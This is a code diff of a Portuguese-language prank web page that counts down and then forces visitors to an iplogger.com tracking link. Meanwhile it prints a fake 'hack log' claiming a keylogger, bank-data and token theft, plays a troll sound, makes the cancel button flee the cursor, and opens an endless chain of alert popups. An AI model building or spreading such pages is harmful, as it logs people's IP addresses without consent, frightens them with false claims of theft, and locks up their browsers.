@@ -1,13 +1,143 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="refresh" content="0; url='https://iplogger.com/2yjcW6'" />
-    <title>#Salveprusmininuduagru</title>
-  </head>
-  <body>
-    <p>O CORINGA ESTEVE POR AQUI AHAHAHAHHAHAHAHAHAHAHAHAHAHAHAHAHAHHAHA</p>
-    <P>clica em link suspeito não pô, Ó SE EU QUISESSE AHHAHAHAHAHAHAHHAHAH</P>
-    <P>Vai Corinthians!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</P>
-  </body>
+<head>
+  <meta charset="UTF-8" />
+  <title>#CoringaModeSério</title>
+  <style>
+    body {
+      font-family: monospace;
+      text-align: center;
+      background-color: #1e1e1e; /* cinza escuro */
+      color: #cccccc;
+      cursor: none;
+      overflow: hidden;
+    }
+
+    .gira {
+      animation: girar 2s linear infinite;
+      font-size: 28px;
+      color: #b30000; /* vermelho escuro */
+    }
+
+    @keyframes girar {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .hack-log {
+     font-size: 14px;
+    color: #cccccc;
+    background-color: #2c2c2c;
+    padding: 3px 10px;
+    margin: 6px auto;
+    border-radius: 4px;
+    box-shadow: 0 0 3px rgba(255, 0, 0, 0.3);
+    display: block; 
+    width: fit-content;
+    }  
+
+
+    .botao-fake {
+      margin-top: 20px;
+      padding: 12px 24px;
+      font-size: 16px;
+      background-color: #550000;
+      border: none;
+      color: #fff;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: background-color 0.3s;
+    }
+
+    .botao-fake:hover {
+      background-color: #770000;
+    }
+  </style>
+
+  <script>
+    let tempo = 10;
+    const destino = "https://iplogger.com/2yjcW6";
+
+    function atualizarContagem() {
+      if (tempo > 0) {
+        document.getElementById("contador").innerText = tempo;
+        tempo--;
+      } else {
+        window.location.href = destino;
+      }
+    }
+
+    function hackearVisual() {
+      const frases = [
+        "Clica em Link suspeito não pô",
+        "HAHAHAHAHAHHAHAAHAHHA",
+        "Iniciando coleta de arquivos do dispositivo",
+        "Capturando seu IP",
+        "Instalando Keylogger",
+        "Capturando dados bancários",
+        "Iniciando Captura de Token",
+        "Rastreando localização via satélite...",
+        "Keylogger Finalizado!",
+        "Coleta de arquivos finalizada!!",
+        "VAI CORINTHIANS!!!!!..."
+      ];
+      let i = 0;
+      setInterval(() => {
+        if (i < frases.length) {
+          const linha = document.createElement("p");
+          linha.innerText = frases[i++];
+          linha.className = "hack-log";
+          document.body.appendChild(linha);
+        }
+      }, 800);
+    }
+
+    function audioZueira() {
+      const audio = new Audio("https://www.myinstants.com/media/sounds/trollololololol.mp3");
+      audio.volume = 0.4;
+      audio.play().catch(() => {});
+    }
+
+    function popupInfinito() {
+      alert("⚠️ Tentativa de cancelamento detectada. Acesso negado.");
+      setTimeout(() => popupInfinito(), 1200);
+    }
+
+    function cancelarRedirecionamento() {
+      popupInfinito();
+    }
+
+    function cursorFugitivo() {
+      document.addEventListener("mousemove", () => {
+        const btn = document.querySelector(".botao-fake");
+        if (!btn) return;
+        const x = Math.random() * (window.innerWidth - 100);
+        const y = Math.random() * (window.innerHeight - 50);
+        btn.style.position = "absolute";
+        btn.style.left = x + "px";
+        btn.style.top = y + "px";
+      });
+    }
+
+    window.onload = function () {
+      setInterval(atualizarContagem, 1000);
+      hackearVisual();
+      audioZueira();
+      cursorFugitivo();
+      setTimeout(() => {
+        alert("🔍 Atividade suspeita detectada. Iniciando contra-medidas...");
+      }, 3000);
+    };
+  </script>
+</head>
+
+<body>
+  <p class="gira">🕶️  O DIDA ESTEVE POR AQUI 🕶️</p>
+  <p>⚠️ Redirecionamento forçado em <span id="contador">10</span> segundos...</p>
+
+  <button class="botao-fake" onclick="cancelarRedirecionamento()">
+    ❌ Cancelar Redirecionamento
+  </button>
+
+</body>
 </html>
